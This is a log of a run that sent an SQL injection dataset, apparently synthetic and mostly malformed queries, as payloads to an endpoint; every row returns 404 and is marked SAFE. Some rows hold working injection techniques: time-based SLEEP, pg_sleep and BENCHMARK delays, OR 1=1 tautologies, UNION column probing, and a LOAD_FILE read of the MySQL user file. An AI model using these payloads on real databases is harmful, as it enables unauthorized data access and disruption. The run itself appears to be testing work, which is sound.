SQL Injection Dataset Results
Start Time: 2026-04-05 15:32:05.442580

[1] SAFE | Status:404 | Time:0.008s | Payload: sql_query,injection_type,vulnerability_status,sql_command,target_table,selected_columns,comparison_operator,logical_operator,sql_comment_syntax
[139] SAFE | Status:404 | Time:0.016s | Payload: EXEC MIN(created_at) FROM admin WHERE status LIKE '2024-01-01' NOT status LIKE 'shipped',None_Type,No,EXEC,admin,MIN(created_at),LIKE,NOT,
[140] SAFE | Status:404 | Time:0.018s | Payload: "INSERT id, email FROM admin WHERE updated_at != 'active' AND updated_at != 'shipped'",None_Type,No,INSERT,admin,"id, email",!=,AND,
[141] SAFE | Status:404 | Time:0.012s | Payload: DELETE MAX(price) FROM employees WHERE user_id BETWEEN 1 AND user_id BETWEEN 'active',None_Type,No,DELETE,employees,MAX(price),BETWEEN,AND,
[142] SAFE | Status:404 | Time:0.012s | Payload: EXEC COUNT(*) FROM credentials WHERE id = 'active' NOT id = '2024-01-01',None_Type,No,EXEC,credentials,COUNT(*),=,NOT,
[143] SAFE | Status:404 | Time:0.01s | Payload: CALL * FROM admin WHERE user_id BETWEEN 'active' OR user_id BETWEEN 1,None_Type,No,CALL,admin,*,BETWEEN,OR,
[144] SAFE | Status:404 | Time:0.009s | Payload: EXEC MIN(created_at) FROM login WHERE updated_at IN '2024-01-01' NOT updated_at IN NULL,None_Type,No,EXEC,login,MIN(created_at),IN,NOT,
[145] SAFE | Status:404 | Time:0.009s | Payload: "INSERT id, email FROM users WHERE user_id = 'pending' NOT user_id = 'shipped'",None_Type,No,INSERT,users,"id, email",=,NOT,
[146] SAFE | Status:404 | Time:0.007s | Payload: SELECT COUNT(*) FROM passwords WHERE id <= 1 LIKE ORDER BY 16 --,Union-Based,Yes,SELECT,passwords,COUNT(*),<=,LIKE,--
[147] SAFE | Status:404 | Time:0.009s | Payload: EXEC MIN(created_at) FROM accounts WHERE email >= 'active' NOT email >= 'safe',None_Type,No,EXEC,accounts,MIN(created_at),>=,NOT,
[148] SAFE | Status:404 | Time:0.008s | Payload: SELECT * FROM login WHERE created_at > NULL AND created_at > 'pending',None_Type,No,SELECT,login,*,>,AND,
[149] SAFE | Status:404 | Time:0.01s | Payload: DELETE FROM admin WHERE id < 1 OR 3409=3409 AND (x=x),boolean-based,Yes,DELETE,admin,*,<,,
[150] SAFE | Status:404 | Time:0.007s | Payload: SELECT MIN(created_at) FROM payments WHERE email BETWEEN 'active' AND email BETWEEN 1,None_Type,No,SELECT,payments,MIN(created_at),BETWEEN,AND,
[151] SAFE | Status:404 | Time:0.009s | Payload: EXEC MIN(created_at) FROM sessions WHERE price LIKE NULL NOT price LIKE 1,None_Type,No,EXEC,sessions,MIN(created_at),LIKE,NOT,
[152] SAFE | Status:404 | Time:0.009s | Payload: "EXEC id, email FROM passwords WHERE order_id IN 'shipped' OR order_id IN 1",None_Type,No,EXEC,passwords,"id, email",IN,OR,
[153] SAFE | Status:404 | Time:0.009s | Payload: "EXEC price, status FROM accounts WHERE order_id < '2024-01-01' NOT order_id < '2024-01-01'",None_Type,No,EXEC,accounts,"price, status",<,NOT,
[154] SAFE | Status:404 | Time:0.009s | Payload: INSERT * FROM transactions WHERE order_id != 'pending' NOT order_id != '2024-01-01',None_Type,No,INSERT,transactions,*,!=,NOT,
[155] SAFE | Status:404 | Time:0.007s | Payload: "CALL price, status FROM payments WHERE order_id IN '2024-01-01' NOT order_id IN 'test@example.com'",None_Type,No,CALL,payments,"price, status",IN,NOT,
[156] SAFE | Status:404 | Time:0.01s | Payload: UPDATE * FROM accounts WHERE updated_at LIKE 1 NOT updated_at LIKE 'test@example.com',None_Type,No,UPDATE,accounts,*,LIKE,NOT,
[157] SAFE | Status:404 | Time:0.007s | Payload: "SELECT price, status FROM users WHERE id < 1 OR ORDER BY 29# #",Error-Based,Yes,SELECT,users,"price, status",<,OR,#
[158] SAFE | Status:404 | Time:0.008s | Payload: UPDATE * FROM passwords WHERE status != '2024-01-01' OR status != 'shipped',None_Type,No,UPDATE,passwords,*,!=,OR,
[159] SAFE | Status:404 | Time:0.006s | Payload: "DELETE price, status FROM transactions WHERE price != 'shipped' NOT price != 'pending'",None_Type,No,DELETE,transactions,"price, status",!=,NOT,
[160] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE created_at, updated_at FROM admin WHERE id BETWEEN 'safe' OR id BETWEEN NULL",None_Type,No,UPDATE,admin,"created_at, updated_at",BETWEEN,OR,
[161] SAFE | Status:404 | Time:0.005s | Payload: DELETE * FROM admin WHERE user_id LIKE 'shipped' AND user_id LIKE 'pending',None_Type,No,DELETE,admin,*,LIKE,AND,
[162] SAFE | Status:404 | Time:0.005s | Payload: INSERT MIN(created_at) FROM admin WHERE user_id BETWEEN 'pending' OR user_id BETWEEN 1,None_Type,No,INSERT,admin,MIN(created_at),BETWEEN,OR,
[163] SAFE | Status:404 | Time:0.006s | Payload: "EXEC('SELECT created_at, updated_at FROM transactions WHERE id >= 1 OR 1=1 UNION SELECT LOAD_FILE('/var/lib/mysql/mysql/user.frm'), null, null, null--') --",stackqueries_based,Yes,EXEC,transactions,"created_at, updated_at",>=,Embedded in Payload,--
[164] SAFE | Status:404 | Time:0.009s | Payload: UPDATE transactions SET name = 'admin' NOT pg_SLEEP(5) WHERE id < 1,Time-Based,Yes,UPDATE,transactions,*,<,NOT,
[165] SAFE | Status:404 | Time:0.011s | Payload: INSERT MIN(created_at) FROM transactions WHERE user_id >= 'pending' NOT user_id >= 'safe',None_Type,No,INSERT,transactions,MIN(created_at),>=,NOT,
[166] SAFE | Status:404 | Time:0.01s | Payload: "INSERT id, email FROM employees WHERE product_id = '2024-01-01' NOT product_id = 'active'",None_Type,No,INSERT,employees,"id, email",=,NOT,
[167] SAFE | Status:404 | Time:0.008s | Payload: INSERT * FROM login WHERE created_at > 'pending' OR created_at > 1,None_Type,No,INSERT,login,*,>,OR,
[168] SAFE | Status:404 | Time:0.01s | Payload: "SELECT price, status FROM users WHERE id <= 1 OR ORDER BY 3 --",Union-Based,Yes,SELECT,users,"price, status",<=,OR,--
[169] SAFE | Status:404 | Time:0.008s | Payload: CALL MIN(created_at) FROM sessions WHERE order_id BETWEEN 1 NOT order_id BETWEEN 1,None_Type,No,CALL,sessions,MIN(created_at),BETWEEN,NOT,
[170] SAFE | Status:404 | Time:0.009s | Payload: INSERT * FROM users WHERE price = 'shipped' AND price = NULL,None_Type,No,INSERT,users,*,=,AND,
[171] SAFE | Status:404 | Time:0.006s | Payload: "CALL price, status FROM payments WHERE price != 'pending' AND price != NULL",None_Type,No,CALL,payments,"price, status",!=,AND,
[172] SAFE | Status:404 | Time:0.008s | Payload: "CALL id, email FROM credentials WHERE email > NULL AND email > 'safe'",None_Type,No,CALL,credentials,"id, email",>,AND,
[173] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT user_id, product_id FROM login WHERE id != 1 OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql')>0--') #",stackqueries_based,Yes,EXEC,login,"user_id, product_id",!=,Embedded in Payload,#
[174] SAFE | Status:404 | Time:0.008s | Payload: EXEC MAX(price) FROM login WHERE status <= 'shipped' NOT status <= 'active',None_Type,No,EXEC,login,MAX(price),<=,NOT,
[175] SAFE | Status:404 | Time:0.007s | Payload: SELECT MAX(price) FROM employees WHERE id >= 1 ORDER BY 10 #,Union-Based,Yes,SELECT,employees,MAX(price),>=,,#
[176] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE id, email FROM credentials WHERE order_id < 'pending' AND order_id < '2024-01-01'",None_Type,No,UPDATE,credentials,"id, email",<,AND,
[177] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM sessions WHERE updated_at <= 1 AND updated_at <= 'active'",None_Type,No,SELECT,sessions,"created_at, updated_at",<=,AND,
[178] SAFE | Status:404 | Time:0.008s | Payload: "SELECT user_id, product_id FROM sessions WHERE id <= 1 NOT SLEEP(10000)",Time-Based,Yes,SELECT,sessions,"user_id, product_id",<=,NOT,
[179] SAFE | Status:404 | Time:0.007s | Payload: INSERT MIN(created_at) FROM credentials WHERE price BETWEEN '2024-01-01' AND price BETWEEN 'safe',None_Type,No,INSERT,credentials,MIN(created_at),BETWEEN,AND,
[180] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM sessions WHERE id < 1 "" or benchmark(10000000,MD5(1))# #",Time-Based,Yes,SELECT,sessions,"user_id, product_id",<,,#
[181] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM users WHERE id IN NULL OR id IN NULL",None_Type,No,SELECT,users,"user_id, product_id",IN,OR,
[182] SAFE | Status:404 | Time:0.007s | Payload: "INSERT created_at, updated_at FROM transactions WHERE user_id > 'safe' OR user_id > 'active'",None_Type,No,INSERT,transactions,"created_at, updated_at",>,OR,
[183] SAFE | Status:404 | Time:0.008s | Payload: UPDATE payments SET username = 'test' NOT ORDER BY 13-- WHERE id != 1 #,Union-Based,Yes,UPDATE,payments,*,!=,NOT,#
[184] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM login WHERE id = 1 AND ORDER BY 28--",Error-Based,Yes,SELECT,login,"user_id, product_id",=,AND,
[185] SAFE | Status:404 | Time:0.007s | Payload: UPDATE * FROM sessions WHERE price LIKE '2024-01-01' OR price LIKE 'active',None_Type,No,UPDATE,sessions,*,LIKE,OR,
[186] SAFE | Status:404 | Time:0.005s | Payload: DELETE MIN(created_at) FROM users WHERE updated_at <= 'shipped' NOT updated_at <= 'pending',None_Type,No,DELETE,users,MIN(created_at),<=,NOT,
[187] SAFE | Status:404 | Time:0.007s | Payload: DELETE FROM employees WHERE id >= 1 AND HAVING 1=1,Error-Based,Yes,DELETE,employees,*,>=,AND,
[188] SAFE | Status:404 | Time:0.005s | Payload: UPDATE COUNT(*) FROM admin WHERE order_id > 'shipped' AND order_id > 'pending',None_Type,No,UPDATE,admin,COUNT(*),>,AND,
[189] SAFE | Status:404 | Time:0.005s | Payload: "SELECT price, status FROM payments WHERE id <= 1 NOT (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- --",Time-Based,Yes,SELECT,payments,"price, status",<=,NOT,--
[190] SAFE | Status:404 | Time:0.008s | Payload: "INSERT price, status FROM users WHERE status <= 'test@example.com' NOT status <= 'pending'",None_Type,No,INSERT,users,"price, status",<=,NOT,
[191] SAFE | Status:404 | Time:0.005s | Payload: SELECT MIN(created_at) FROM sessions WHERE id != 1 NOT ORDER BY 13,Union-Based,Yes,SELECT,sessions,MIN(created_at),!=,NOT,
[192] SAFE | Status:404 | Time:0.006s | Payload: EXEC * FROM accounts WHERE product_id >= NULL AND product_id >= NULL,None_Type,No,EXEC,accounts,*,>=,AND,
[193] SAFE | Status:404 | Time:0.006s | Payload: UPDATE * FROM admin WHERE status < 'safe' AND status < 'safe',None_Type,No,UPDATE,admin,*,<,AND,
[194] SAFE | Status:404 | Time:0.005s | Payload: "INSERT user_id, product_id FROM passwords WHERE product_id >= 'shipped' OR product_id >= 'safe'",None_Type,No,INSERT,passwords,"user_id, product_id",>=,OR,
[195] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE id, email FROM users WHERE id <= '2024-01-01' NOT id <= 'shipped'",None_Type,No,UPDATE,users,"id, email",<=,NOT,
[196] SAFE | Status:404 | Time:0.005s | Payload: "EXEC user_id, product_id FROM transactions WHERE updated_at IN 'active' OR updated_at IN 'test@example.com'",None_Type,No,EXEC,transactions,"user_id, product_id",IN,OR,
[197] SAFE | Status:404 | Time:0.008s | Payload: CALL * FROM sessions WHERE updated_at >= 'pending' OR updated_at >= 'test@example.com',None_Type,No,CALL,sessions,*,>=,OR,
[198] SAFE | Status:404 | Time:0.005s | Payload: UPDATE MAX(price) FROM login WHERE user_id != 'safe' NOT user_id != NULL,None_Type,No,UPDATE,login,MAX(price),!=,NOT,
[199] SAFE | Status:404 | Time:0.005s | Payload: DELETE * FROM sessions WHERE product_id BETWEEN 'shipped' OR product_id BETWEEN 'test@example.com',None_Type,No,DELETE,sessions,*,BETWEEN,OR,
[200] SAFE | Status:404 | Time:0.006s | Payload: "SELECT user_id, product_id FROM login WHERE id <= 1 LIKE ORDER BY 2#",Error-Based,Yes,SELECT,login,"user_id, product_id",<=,LIKE,
[201] SAFE | Status:404 | Time:0.006s | Payload: EXEC('SELECT MAX(price) FROM credentials WHERE id = 1 OR ORDER BY 26') --,Union-Based,Yes,EXEC,credentials,MAX(price),=,OR,--
[202] SAFE | Status:404 | Time:0.005s | Payload: INSERT COUNT(*) FROM transactions WHERE user_id = 'safe' NOT user_id = 'test@example.com',None_Type,No,INSERT,transactions,COUNT(*),=,NOT,
[203] SAFE | Status:404 | Time:0.009s | Payload: "EXEC('SELECT id, email FROM payments WHERE id >= 1 OR 3409=3409 AND (1=0) AND (SUBSTRING('admin',1,1) = 'a' OR SUBSTRING('admin',2,1) = 'd')') #",boolean-based,Yes,EXEC,payments,"id, email",>=,,#
[204] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM sessions WHERE product_id < 'test@example.com' OR product_id < 'test@example.com'",None_Type,No,SELECT,sessions,"price, status",<,OR,
[205] SAFE | Status:404 | Time:0.008s | Payload: UPDATE COUNT(*) FROM users WHERE price <= 'safe' NOT price <= 'pending',None_Type,No,UPDATE,users,COUNT(*),<=,NOT,
[206] SAFE | Status:404 | Time:0.008s | Payload: EXEC MIN(created_at) FROM passwords WHERE id >= 'test@example.com' AND id >= 1,None_Type,No,EXEC,passwords,MIN(created_at),>=,AND,
[207] SAFE | Status:404 | Time:0.008s | Payload: CALL COUNT(*) FROM credentials WHERE price <= 'pending' NOT price <= 'safe',None_Type,No,CALL,credentials,COUNT(*),<=,NOT,
[208] SAFE | Status:404 | Time:0.006s | Payload: UPDATE MIN(created_at) FROM login WHERE updated_at LIKE 'test@example.com' OR updated_at LIKE 'pending',None_Type,No,UPDATE,login,MIN(created_at),LIKE,OR,
[209] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT id, email FROM credentials WHERE id = 1 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))') #",Time-Based,Yes,EXEC,credentials,"id, email",=,,#
[210] SAFE | Status:404 | Time:0.006s | Payload: DELETE MIN(created_at) FROM passwords WHERE id = 1 AND id = NULL,None_Type,No,DELETE,passwords,MIN(created_at),=,AND,
[211] SAFE | Status:404 | Time:0.008s | Payload: "SELECT id, email FROM accounts WHERE created_at <= 'active' NOT created_at <= 'shipped'",None_Type,No,SELECT,accounts,"id, email",<=,NOT,
[212] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM employees WHERE id >= 'shipped' AND id >= '2024-01-01'",None_Type,No,SELECT,employees,"created_at, updated_at",>=,AND,
[213] SAFE | Status:404 | Time:0.011s | Payload: SELECT MIN(created_at) FROM employees WHERE email >= 'shipped' AND email >= 'test@example.com',None_Type,No,SELECT,employees,MIN(created_at),>=,AND,
[214] SAFE | Status:404 | Time:0.007s | Payload: DELETE FROM admin WHERE id <= 1 AND pg_sleep(5)--,Time-Based,Yes,DELETE,admin,*,<=,AND,
[215] SAFE | Status:404 | Time:0.009s | Payload: "SELECT user_id, product_id FROM passwords WHERE id = 1 NOT AND 1=1 HAVING COUNT(*) > 0 -- --",meta_based,Yes,SELECT,passwords,"user_id, product_id",=,NOT,--
[216] SAFE | Status:404 | Time:0.009s | Payload: DELETE MAX(price) FROM employees WHERE id BETWEEN 'shipped' NOT id BETWEEN '2024-01-01',None_Type,No,DELETE,employees,MAX(price),BETWEEN,NOT,
[217] SAFE | Status:404 | Time:0.007s | Payload: INSERT MIN(created_at) FROM payments WHERE updated_at BETWEEN NULL NOT updated_at BETWEEN 'test@example.com',None_Type,No,INSERT,payments,MIN(created_at),BETWEEN,NOT,
[218] SAFE | Status:404 | Time:0.01s | Payload: "SELECT price, status FROM accounts WHERE product_id > 'safe' NOT product_id > '2024-01-01'",None_Type,No,SELECT,accounts,"price, status",>,NOT,
[219] SAFE | Status:404 | Time:0.009s | Payload: "CALL created_at, updated_at FROM employees WHERE created_at IN 1 AND created_at IN 1",None_Type,No,CALL,employees,"created_at, updated_at",IN,AND,
[220] SAFE | Status:404 | Time:0.012s | Payload: DELETE MIN(created_at) FROM passwords WHERE user_id IN 'test@example.com' OR user_id IN 'shipped',None_Type,No,DELETE,passwords,MIN(created_at),IN,OR,
[221] SAFE | Status:404 | Time:0.011s | Payload: "EXEC price, status FROM accounts WHERE price >= 'test@example.com' AND price >= 'pending'",None_Type,No,EXEC,accounts,"price, status",>=,AND,
[222] SAFE | Status:404 | Time:0.007s | Payload: EXEC MAX(price) FROM login WHERE user_id LIKE 'pending' NOT user_id LIKE NULL,None_Type,No,EXEC,login,MAX(price),LIKE,NOT,
[223] SAFE | Status:404 | Time:0.007s | Payload: "CALL price, status FROM admin WHERE created_at != 'active' OR created_at != 1",None_Type,No,CALL,admin,"price, status",!=,OR,
[224] SAFE | Status:404 | Time:0.005s | Payload: "SELECT user_id, product_id FROM admin WHERE id = 1 NOT ORDER BY 31337-- --",Error-Based,Yes,SELECT,admin,"user_id, product_id",=,NOT,--
[225] SAFE | Status:404 | Time:0.006s | Payload: INSERT * FROM employees WHERE product_id != NULL NOT product_id != 'safe',None_Type,No,INSERT,employees,*,!=,NOT,
[226] SAFE | Status:404 | Time:0.009s | Payload: "EXEC('SELECT created_at, updated_at FROM employees WHERE id = 1 OR 3409=3409 AND (1=1) AND (LENGTH('admin') = 5)') #",boolean-based,Yes,EXEC,employees,"created_at, updated_at",=,,#
[227] SAFE | Status:404 | Time:0.008s | Payload: "UPDATE created_at, updated_at FROM users WHERE user_id IN 'active' NOT user_id IN NULL",None_Type,No,UPDATE,users,"created_at, updated_at",IN,NOT,
[228] SAFE | Status:404 | Time:0.006s | Payload: INSERT COUNT(*) FROM admin WHERE status = 1 NOT status = NULL,None_Type,No,INSERT,admin,COUNT(*),=,NOT,
[229] SAFE | Status:404 | Time:0.005s | Payload: EXEC('SELECT * FROM transactions WHERE id = 1 OR ORDER BY 31337--'),Error-Based,Yes,EXEC,transactions,*,=,OR,
[230] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM passwords WHERE id < 1 (SELECT * FROM (SELECT(SLEEP(5)))ecMj)",Time-Based,Yes,SELECT,passwords,"id, email",<,,
[231] SAFE | Status:404 | Time:0.005s | Payload: UPDATE * FROM login WHERE order_id <= '2024-01-01' OR order_id <= 1,None_Type,No,UPDATE,login,*,<=,OR,
[232] SAFE | Status:404 | Time:0.006s | Payload: "SELECT price, status FROM sessions WHERE product_id IN NULL AND product_id IN 'active'",None_Type,No,SELECT,sessions,"price, status",IN,AND,
[233] SAFE | Status:404 | Time:0.006s | Payload: INSERT MAX(price) FROM payments WHERE updated_at = 'shipped' NOT updated_at = NULL,None_Type,No,INSERT,payments,MAX(price),=,NOT,
[234] SAFE | Status:404 | Time:0.006s | Payload: DELETE MAX(price) FROM passwords WHERE product_id >= 'pending' OR product_id >= 1,None_Type,No,DELETE,passwords,MAX(price),>=,OR,
[235] SAFE | Status:404 | Time:0.007s | Payload: "DELETE id, email FROM users WHERE order_id <= 'safe' AND order_id <= 'pending'",None_Type,No,DELETE,users,"id, email",<=,AND,
[236] SAFE | Status:404 | Time:0.008s | Payload: "INSERT price, status FROM payments WHERE email < 'safe' AND email < '2024-01-01'",None_Type,No,INSERT,payments,"price, status",<,AND,
[237] SAFE | Status:404 | Time:0.007s | Payload: "EXEC('SELECT user_id, product_id FROM credentials WHERE id = 1 OR "" OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --') --",meta_based,Yes,EXEC,credentials,"user_id, product_id",=,OR,--
[238] SAFE | Status:404 | Time:0.005s | Payload: "EXEC id, email FROM employees WHERE created_at < 'active' NOT created_at < NULL",None_Type,No,EXEC,employees,"id, email",<,NOT,
[239] SAFE | Status:404 | Time:0.006s | Payload: DELETE COUNT(*) FROM credentials WHERE created_at > NULL AND created_at > 1,None_Type,No,DELETE,credentials,COUNT(*),>,AND,
[240] SAFE | Status:404 | Time:0.008s | Payload: DELETE FROM credentials WHERE id != 1 OR RANDOMBLOB(1000000000/2) --,Time-Based,Yes,DELETE,credentials,*,!=,OR,--
[241] SAFE | Status:404 | Time:0.006s | Payload: DELETE MAX(price) FROM sessions WHERE email != 'safe' OR email != 'test@example.com',None_Type,No,DELETE,sessions,MAX(price),!=,OR,
[242] SAFE | Status:404 | Time:0.008s | Payload: "UPDATE created_at, updated_at FROM sessions WHERE status = 'shipped' OR status = 'active'",None_Type,No,UPDATE,sessions,"created_at, updated_at",=,OR,
[243] SAFE | Status:404 | Time:0.005s | Payload: DELETE FROM credentials WHERE id != 1 LIKE &&SLEEP(5)#,Time-Based,Yes,DELETE,credentials,*,!=,LIKE,
